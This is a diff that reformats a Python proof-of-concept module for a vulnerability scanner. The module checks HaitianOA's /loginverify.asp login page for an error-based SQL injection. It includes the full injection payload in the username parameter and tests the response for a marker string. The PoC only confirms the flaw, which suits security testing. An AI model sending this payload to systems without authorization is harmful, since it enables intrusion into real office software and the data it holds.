@@ -3,11 +3,12 @@
 from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 
+
 class Vuln(ABVuln):
-    vuln_id = 'HaitianOA_0002' # 平台漏洞编号，留空
+    vuln_id = 'HaitianOA_0002'  # 平台漏洞编号，留空
     name = 'HaitianOA SQL注入'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.INJECTION # 漏洞类型
+    type = VulnType.INJECTION  # 漏洞类型
     disclosure_date = '2014-05-23'  # 漏洞公布时间
     desc = '''
         HaitianOA系统 /loginverify.asp 参数过滤不完整，导致SQL注入漏洞。
@@ -17,6 +18,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = '海天OA'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = '95a4a90e-dd24-4d10-89be-cda3fe02f3b7'
@@ -30,15 +32,16 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
-            #http://www.wooyun.org/bugs/wooyun-2010-061977，http://www.wooyun.org/bugs/wooyun-2010-061213
+
+            # http://www.wooyun.org/bugs/wooyun-2010-061977，http://www.wooyun.org/bugs/wooyun-2010-061213
             hh = hackhttp.hackhttp()
             arg = self.target
             payload = "/loginverify.asp?Digest=&urlFrom=&password=admin&Memo=1&username=1'/**/AND/**/1="
-            code, head, res, errorcode, _url = hh.http(arg + payload + 'CONVERT(int,%27test%27%2b%27vul%27)--')
+            code, head, res, errorcode, _url = hh.http(
+                arg + payload + 'CONVERT(int,%27test%27%2b%27vul%27)--')
 
-            if code == 200 and 'testvul' in res :
-            #security_hole(arg+payload)
+            if code == 200 and 'testvul' in res:
+                # security_hole(arg+payload)
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
 
@@ -47,6 +50,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
